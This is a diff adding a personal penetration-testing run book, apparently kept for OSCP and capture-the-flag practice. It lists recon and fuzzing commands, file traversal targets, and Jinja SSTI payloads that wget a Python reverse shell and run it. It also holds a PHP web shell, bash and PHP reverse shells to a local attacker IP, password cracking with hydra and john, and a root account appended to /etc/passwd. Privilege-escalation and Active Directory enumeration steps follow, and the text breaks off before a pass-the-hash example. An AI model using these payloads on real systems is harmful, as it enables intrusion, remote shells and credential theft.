@@ -1,0 +1,409 @@
+Run Book
+
+
+============================================
+SETUP
+============================================
+box=<Boxname>
+ip=<target ip>
+mkdir $box
+cd $box
+mkdir screenshots
+mkdir exploits
+touch histroy.txt
+touch pass.txt
+touch users.txt
+
+============================================
+Basic stuff (in case i forget) 
+============================================
+
+-----
+SSH 
+-----
+ssh-keygen -f "/home/<localuser>/.ssh/known_hosts" -R "[<host>]:2222"
+ssh -p 2222 <user>@<ip>
+
+----------------
+Remote desktop 
+----------------
+rdesktop <ip>
+
+xfreerdp -p <password> -u <user> <target ip>
+
+-----
+RPC
+-----
+rpcclient -U "" -N <targetip> ##### anon rpc ######
+----------------
+File Transfers 
+----------------
+Quick server 
+python -m http.server 80
+
+$client = new-object System.Net.WebClient
+(new-object System.Net.WebClient)DownloadFile("<ip>/<file>,"<newfilename>")
+curl <localip>/shell.msi -O <new filename>
+Invoke-WebRequest -URI $URL -OutFile $Path //Curl equivalent 
+
+
+
+============================================
+Recon
+============================================
+
+---------------
+Port scanning
+---------------
+nmap -p- -sV -sT $ip --open 
+nmap -p- -sC -sT $ip --open 
+
+---------
+Fuzzing 
+---------
+
+Dirb $url -r -z 10 
+wfuzz -c -z file,/opt/lists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://$ip/FUZZ"
+wfuzz -c -z file,/opt/lists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://$ip/FUZZ/" 
+wfuzz -c -z file,/opt/lists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt --hc 404 "$ip/FUZZ/" #####MoreDirectorys#####
+wfuzz -c -z file,/opt/lists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://$ip/FUZZ.php" #####run if we see php ######
+
+-------------
+WPSCAN
+-------------
+wpscan --url http://$ip/ --disable-tls-checks --enumerate p --enumerate t --enumerate u
+wpscan --url http://blogger.thm/assets/fonts/blog/ --enumerate p --plugins-detection aggressive 
+wpscan --url http://$ip/ -U <user> -P /usr/share/wordlists/rockyou.txt
+
+Remember to check if modules/plugins have vulnerabilities 
+
+------------------
+Smb null session
+------------------
+
+nmap -p <port(s) 1,2> --script=smb-enum-shares $ip
+smbclient //$ip/<ipc> -N
+
+-------------------------------------
+Image Hidden Data(mostly for CTFs)
+-------------------------------------
+
+steghide -- extract -sf <image>
+
+------------------
+mysql navigation
+------------------
+
+show databases;
+use <db>
+show tables
+
+============================================
+Attacks(initial) 
+============================================
+
+----------------
+File traversal
+----------------
+
+Things to check Linux:
+home/<user>/id_rsa
+/etc/passwd
+/etc/shadow
+/dev
+.htpasswd
+../../../../../../../etc/httpd/logs/error.log
+../../../../../../../var/www/logs/access_log
+../apache/logs/error.log
+../apache/logs/access.log
+
+Windows:
+c:\ProgramFiles
+/..\..\..\..\..\..\winnt\win.ini
+
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+--------------
+php weeknesses 
+--------------
+php string cmp can be bypassed see following:
+https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016
+
+------
+SSTI ()
+------
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+
+
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+ssti -> jinja _> {{config.__class__.__init__.__globals__['os'].popen('wget <localserver>/pythonreverseshell.py -O /var/tmp/owned.py').read()}} -> {{config.__class__.__init__.__globals__['os'].popen('python /var/tmp/owned.py').read()}}
+
+
+---------------------------------
+Candidate injection strings WIP
+--------------------------------
+Injection strings 
+id  
+;id; 
+'
+----------------
+ldap injectiom
+----------------
+
+-----------
+Passwords
+-----------
+crack station #hash cracking#
+hydra -L users -P /usr/share/wordlists/rockyou.txt ssh://$ip
+
+----------
+WP admin
+----------
+you can update the template to add rce in the url use that to get shell see code below
+
+'''
+
+<?php
+echo "<pre>"
+passthru($_get['cmd']);
+system($_get['cmd']);
+exec($_get['cmd']);
+shell_exec($_get['cmd']);
+pOpen($_get['cmd']);
+
+echo "</pre>";
+?>
+
+'''
+
+--------
+Shells
+--------
+
+nc -nlvp 443  
+
+Payloads BASH: 
+bash -i >& /dev/tcp/<localip>/9090 0>&1
+bash -c 'bash -i >& /dev/tcp/<localip>/9090 0>&1'
+
+
+Bind shell socat:
+socat%20-d%20-d%20TCP-LISTEN:60000%20EXEC:/bin/bash
+
+php rev shelll:
+php -r '$sock=fsockopen("<localip>",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+--------------
+ssh cracking 
+--------------
+
+chmod 600 id_rsa 
+ssh2john id_rsa > crackme
+john --wordlist=/usr/share/wordlists/rockyou.txt crackme
+
+===========================
+SQL MAP FORBIDDEN ON OSCP
+===========================
+Step 1 find location of vulnerable url mark week param with * 
+Step 2 find db by throwing an error try 
+%27url="http://$ip/<dir>/<file>?<weekparam> =*"
+Step 3 sqlmap -u $url --thread=2 --time-sec10 --level4 --risk=3 --dump --dbms=<dbms> -dbs
+
+============================================
+Upgrade shell
+============================================
+python2.7 -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
+export TERM=xterm-256color
+alias ll='ls -lsaht --color=auto'
+Ctrl + Z [Background Process]
+stty raw -echo ; fg ; reset
+stty columns 200 rows 200 -a
+
+
+============================================
+Priv Esc Linux
+============================================
+
+-----------------
+enum on machine
+-----------------
+
+find / -perm -u=s -type f 2>/dev/null
+sudo -l
+####if we find something like /notes/* we can use like ../../bin/sh probably#####
+####gtfobins####
+
+-----------------
+Files to check:
+-----------------
+
+cat /etc/passwd
+cat /etc/passwd|grep -iE '/bin/sh|/bin/bash'
+cat /etc/fstab
+cat /etc/crontab
+
+-------------
+Directories
+-------------
+
+/etc ###looking for programs with non defualt perms###
+ls -lsa |grep -i 'cron' --color=auto ###in /etc###
+
+/opt
+/home - check for bash historys or other readable files
+/var/tmp
+/var/www/html
+/var/mail
+/var/spool/mail
+/etc
+/tmp
+/dev/shm
+
+
+---------------
+SUIDS & GUIDS
+---------------
+Find SUID
+find / -perm -u=s -type f 2>/dev/null
+Find GUID 
+find / -perm -g=s -type f 2>/dev/null
+
+-----------
+More enum
+-----------
+
+netstat -antup
+ss -tunlp
+which gcc 
+which cc
+pspy #download from local#
+ls -lsa /etc/|grep-i '.secret' --color=auto
+ls -lsaht /etc/|grep-i '.conf' --color=auto
+ps aux |grep -i 'root' --- get pids runnign with root 
+getcap -r / 2>/dev/null
+
+------------------------
+Known Vulnerabilities:
+------------------------
+
+Serv-u
+sudo perl -e'exec "/bin/sh"'
+when in doubt try basic creds
+
+Unsecure perms on /etc/passwd From s1ren security ->
+openssl passwd -1
+i<3hacking
+$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
+echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd
+su siren
+id
+
+----------------
+Automatic Enum
+----------------
+
+wget  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+
+
+============================================
+Priv Esc Windows
+============================================
+
+------------
+Basic CMDs
+------------
+
+type <filename> //cat 
+
+-------------
+Directorys
+-------------
+
+dir /a /o /q #ls -la#
+Program Files
+
+------------
+Other Enum
+------------
+
+whoami /priv
+tasklist /v
+net users
+
+-----------------
+buffer overflow
+-----------------
+
+Object dump find stuff in binarys 
+objdump -d <>.exe | grep 'flag'
+xxd -g 1 -c 8 exploit.txt
+
+
+=================
+Active directory 
+=================
+
+POI enum
+
+AD Users
+We are trying to enumerate valid user accounts we can target for password spraying.
+
+AD Joined Computers
+Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.
+
+Key Services
+Kerberos, NetBIOS, LDAP, DNS
+
+Vulnerable Hosts and Services
+Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)
+
+
+wire shark can be used to find arp packets to identify new hosts
+
+tcpdump can do the same on cli 
+
+-----------------------------
+sudo responder -I ens224 -A 
+-----------------------------
+fping -asgq <ip>/23
+view the range of the network is known 
+
+we can then nmap those hosts 
+sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
+
+------------------
+INternal AD enum 
+------------------
+kerbrute -
+sudo git clone https://github.com/ropnop/kerbrute.git
+ sudo make all
+ move desired version to machine 
+ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc <ip> jsmith.txt -o valid_ad_users
+ 
+ 
+ 
+ sudo responder -I ens224 -> /usr/share/responder/logs
+ 
+
+-----------------------------------
+Sample kerberous hash breask down
+-----------------------------------
+
+Rachel:500:<LMHASh>:<NT>:::
+
+Looking at the hash above, we can break the NTLM hash down into its individual parts:
+
+    Rachel is the username
+    500 is the Relative Identifier (RID). 500 is the known RID for the administrator account
+    <LMHASH> is the LM hash and, if LM hashes are disabled on the system, can not be used for anything
+    <NT> is the NT hash. This hash can either be cracked offline to reveal the cleartext value (depending on the length/strength of the password) or used for a pass-the-hash attack. Below is an example of a successful pass-the-hash attack using the CrackMapExec tool:
